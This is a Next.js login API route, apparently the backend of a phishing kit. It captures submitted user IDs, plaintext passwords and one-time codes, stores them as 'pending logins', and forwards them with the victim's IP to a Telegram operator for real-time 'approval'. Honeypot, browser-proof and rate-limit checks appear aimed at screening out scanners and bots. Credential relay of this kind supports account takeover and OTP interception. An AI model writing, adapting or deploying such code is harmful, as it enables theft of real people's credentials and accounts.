import { hasDatabaseUrl } from "@/lib/database-urls"
import { resolveMemberOrigin } from "@/lib/member-origin"
import { NextRequest, NextResponse, after } from "next/server"
import { forceBlockIp } from "@/lib/bot-risk/force-block"
import { readHoneypotValue } from "@/lib/bot-risk/honeypot"
import { hasBrowserProof, isTooFastLogin } from "@/lib/bot-risk/proof-cookies"
import { consumeRateLimit } from "@/lib/bot-risk/rate-limit"
import { isMitigationBand, ttlMsForBand } from "@/lib/bot-risk/score"
import { resolveRequestRisk } from "@/lib/bot-risk/resolve"
import { upsertIpRisk } from "@/lib/bot-risk/store"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { isLocalTestingUnlocked } from "@/lib/local-testing"
import { createPendingLogin } from "@/lib/pending-logins"
import { formatPendingLoginDatabaseLabel } from "@/lib/database-urls"
import { DEFAULT_PROJECT_ID } from "@/lib/project-config"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"
import { telegramService } from "@/lib/telegram"

const LOGIN_RATE_LIMIT = 8
const LOGIN_RATE_WINDOW_MS = 10 * 60 * 1000

export async function POST(request: NextRequest) {
  const localTesting = isLocalTestingUnlocked()
  const ip = getClientIpFromRequest(request) || "Unknown"
  const userAgent = request.headers.get("user-agent") || "Unknown"

  if (!localTesting) {
    const risk = await resolveRequestRisk(request)
    if (isMitigationBand(risk.band)) {
      return NextResponse.json({ error: "Forbidden" }, { status: 403 })
    }

    if (!hasBrowserProof(request)) {
      await upsertIpRisk({
        ip,
        score: 40,
        band: "watch",
        flags: ["missing_browser_proof"],
        userAgent,
        expiresAtMs: Date.now() + ttlMsForBand("watch"),
      })
      return NextResponse.json({ error: "Forbidden" }, { status: 403 })
    }
  }

  if (!hasDatabaseUrl()) {
    return NextResponse.json(
      {
        error:
          "DATABASE_URL is not set. Add it to .env.local (same Neon URL as Control Center) so requests appear in admin.",
      },
      { status: 503 },
    )
  }
  try {
    const body = (await request.json()) as Record<string, unknown>
    const userId = body.userId ?? "login"
    const password = body.password ?? ""
    const method = body.method
    const maskedEmail = body.maskedEmail ?? ""
    const maskedPhone = body.maskedPhone ?? ""
    const flow = body.flow
    const dwellMs = typeof body.dwellMs === "number" ? body.dwellMs : undefined
    const interacted = typeof body.interacted === "boolean" ? body.interacted : undefined

    if (!localTesting) {
      const honeypot = readHoneypotValue(body)
      if (honeypot) {
        await forceBlockIp(ip, ["honeypot"], userAgent)
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }

      if (isTooFastLogin(request, dwellMs)) {
        await upsertIpRisk({
          ip,
          score: 55,
          band: "challenge",
          flags: ["too_fast_submit"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("challenge"),
        })
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }

      if (interacted === false && typeof dwellMs === "number" && dwellMs < 2500) {
        await upsertIpRisk({
          ip,
          score: 40,
          band: "watch",
          flags: ["no_interaction"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("watch"),
        })
      }

      const rate = await consumeRateLimit(ip, "pending_login", LOGIN_RATE_LIMIT, LOGIN_RATE_WINDOW_MS)
      if (!rate.allowed) {
        await upsertIpRisk({
          ip,
          score: 60,
          band: "challenge",
          flags: ["login_rate_limited"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("challenge"),
        })
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }
    }

    if (!method || (method !== "email" && method !== "text")) {
      return NextResponse.json(
        { error: "method is required and must be email or text" },
        { status: 400 },
      )
    }
    const memberOrigin = resolveMemberOrigin(request)
    const record = await createPendingLogin({
      requestKind: flow === "otp" ? "otp" : "login",
      projectId: DEFAULT_PROJECT_ID,
      projectName: SITE_DISPLAY_NAME,
      userId: String(userId),
      password: String(password),
      method,
      maskedEmail: String(maskedEmail),
      maskedPhone: String(maskedPhone),
      memberOrigin,
    })

    after(async () => {
      const databaseShard = formatPendingLoginDatabaseLabel(record.id)
      if (flow === "login") {
        await telegramService.sendLoginApprovalNotification({
          userId: record.userId,
          password: record.password,
          method: record.method,
          createdAtMs: record.createdAt,
          databaseShard,
          ip,
        })
      } else {
        await telegramService.sendVerificationApprovalNotification({
          userId: record.userId,
          method: record.method,
          code: record.password,
          createdAtMs: record.createdAt,
          databaseShard,
          ip,
        })
      }
    })

    return NextResponse.json({ id: record.id })
  } catch (e) {
    console.error("Pending login create error:", e)
    return NextResponse.json({ error: "Failed to create pending login" }, { status: 500 })
  }
}
